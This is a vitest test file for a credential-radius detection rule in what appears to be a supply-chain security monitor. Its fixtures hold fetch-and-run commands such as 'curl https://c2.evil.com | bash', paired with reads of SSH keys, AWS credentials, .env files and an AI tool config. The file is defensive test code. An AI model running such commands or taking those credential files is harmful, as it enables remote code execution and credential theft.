import { describe, it, expect } from 'vitest';
import { checkCredentialRadius } from '../src/audit/rules/credential-radius.js';
import type { SystemSnapshot } from '../src/types.js';

function baseSnapshot(): SystemSnapshot {
  return {
    timestamp: Date.now(),
    yieldclaw: { ok: false, error: 'n/a', latencyMs: 0 },
    mm: { ok: false, error: 'n/a', latencyMs: 0 },
    guardian: { ok: false, error: 'n/a', latencyMs: 0 },
    otterclaw: { ok: false, error: 'n/a', latencyMs: 0 },
    growthAgent: { ok: false, error: 'n/a', latencyMs: 0 },
    listing: { ok: false, error: 'n/a', latencyMs: 0 },
  };
}

describe('CredentialRadiusRule', () => {
  it('returns empty when no process/filesystem probes', () => {
    expect(checkCredentialRadius(baseSnapshot())).toHaveLength(0);
  });

  it('returns empty when no suspicious processes', () => {
    const snapshot: SystemSnapshot = {
      ...baseSnapshot(),
      process: {
        ok: true, latencyMs: 5,
        data: { processes: [], suspiciousChildren: [], nodeProcessCount: 1 },
      },
      filesystem: {
        ok: true, latencyMs: 5,
        data: {
          sensitivePathAccesses: [{ path: '/home/user/.ssh/id_rsa', operation: 'read', timestamp: Date.now() }],
          modifiedFiles: [],
        },
      },
    };
    expect(checkCredentialRadius(snapshot)).toHaveLength(0);
  });

  it('returns empty when no sensitive path accesses', () => {
    const snapshot: SystemSnapshot = {
      ...baseSnapshot(),
      process: {
        ok: true, latencyMs: 5,
        data: {
          processes: [],
          suspiciousChildren: [{ pid: 1, name: 'curl', command: 'curl https://evil.com | bash', ppid: 0 }],
          nodeProcessCount: 0,
        },
      },
      filesystem: {
        ok: true, latencyMs: 5,
        data: { sensitivePathAccesses: [], modifiedFiles: [] },
      },
    };
    expect(checkCredentialRadius(snapshot)).toHaveLength(0);
  });

  it('detects credential access + suspicious process correlation', () => {
    const snapshot: SystemSnapshot = {
      ...baseSnapshot(),
      process: {
        ok: true, latencyMs: 5,
        data: {
          processes: [],
          suspiciousChildren: [
            { pid: 999, name: 'node', command: 'curl https://evil.com/exfil | bash', ppid: 100 },
          ],
          nodeProcessCount: 1,
        },
      },
      filesystem: {
        ok: true, latencyMs: 5,
        data: {
          sensitivePathAccesses: [
            { path: '/home/user/.ssh/id_rsa', operation: 'read', timestamp: Date.now() },
            { path: '/home/user/.aws/credentials', operation: 'read', timestamp: Date.now() },
          ],
          modifiedFiles: [],
        },
      },
    };

    const alerts = checkCredentialRadius(snapshot);
    expect(alerts.length).toBeGreaterThanOrEqual(1);
    const credAlert = alerts.find(a => a.check === 'credential_radius');
    expect(credAlert).toBeDefined();
    expect(credAlert!.severity).toBe('critical');
    expect(credAlert!.source).toBe('supply-chain');
  });

  it('detects AI tool config access + suspicious process correlation', () => {
    const snapshot: SystemSnapshot = {
      ...baseSnapshot(),
      process: {
        ok: true, latencyMs: 5,
        data: {
          processes: [],
          suspiciousChildren: [
            { pid: 999, name: 'node', command: 'eval(something)', ppid: 100 },
          ],
          nodeProcessCount: 1,
        },
      },
      filesystem: {
        ok: true, latencyMs: 5,
        data: {
          sensitivePathAccesses: [
            { path: '/home/user/.claude/config.json', operation: 'read', timestamp: Date.now() },
          ],
          modifiedFiles: [],
        },
      },
    };

    const alerts = checkCredentialRadius(snapshot);
    const aiAlert = alerts.find(a => a.check === 'ai_tool_config_access');
    expect(aiAlert).toBeDefined();
    expect(aiAlert!.severity).toBe('high');
  });

  it('detects .env access with suspicious process', () => {
    const snapshot: SystemSnapshot = {
      ...baseSnapshot(),
      process: {
        ok: true, latencyMs: 5,
        data: {
          processes: [],
          suspiciousChildren: [
            { pid: 888, name: 'bash', command: 'curl https://c2.evil.com | bash', ppid: 100 },
          ],
          nodeProcessCount: 0,
        },
      },
      filesystem: {
        ok: true, latencyMs: 5,
        data: {
          sensitivePathAccesses: [
            { path: '/app/.env', operation: 'read', timestamp: Date.now() },
          ],
          modifiedFiles: [],
        },
      },
    };

    const alerts = checkCredentialRadius(snapshot);
    expect(alerts.some(a => a.check === 'credential_radius')).toBe(true);
  });
});
